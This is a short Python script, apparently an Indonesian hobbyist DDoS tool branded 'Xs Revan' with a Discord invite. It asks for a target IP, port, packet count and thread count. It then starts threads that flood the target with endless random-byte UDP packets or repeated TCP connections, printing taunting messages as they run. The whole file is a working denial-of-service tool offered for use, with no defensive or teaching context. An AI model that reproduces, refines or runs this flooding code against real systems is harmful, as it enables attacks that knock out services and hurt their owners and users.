#!/usr/bin/env python3
#Tools by Xs Revan
#Join My T3Am : https://discord.gg/9bYAMfjG26
import random
import socket
import threading
import os

os.system("clear")
print("--> Pembuat : Xs Revan  Code : XSRVN <--")
print("-->        Dd0s By Xs Revan <--")
print("#--        XS REVAN NIH CUY --#")
ip = str(input(" [DD0SBYREVAN] Ip:"))
port = int(input(" [DD0SBYREVAN] Port:"))
choice = str(input(" [DD0SBYREVAN] Gas Ddos cuy?(y/n):"))
times = int(input(" [DD0SBYREVAN] Packets:"))
threads = int(input(" [DD0SBYREVAN] Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[♥‿♥]","[( ˘▽˘)っ]","[(￣ω￣)]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YAHAHA KE SERANG!!!")
		except:
			print("[!] SERVER LEMAH DAH DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XS REVAN NIH CUY!!!")
		except:
			s.close()
			print("[*] CUPU BET ANYING DOWN LAGI (>_<))")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
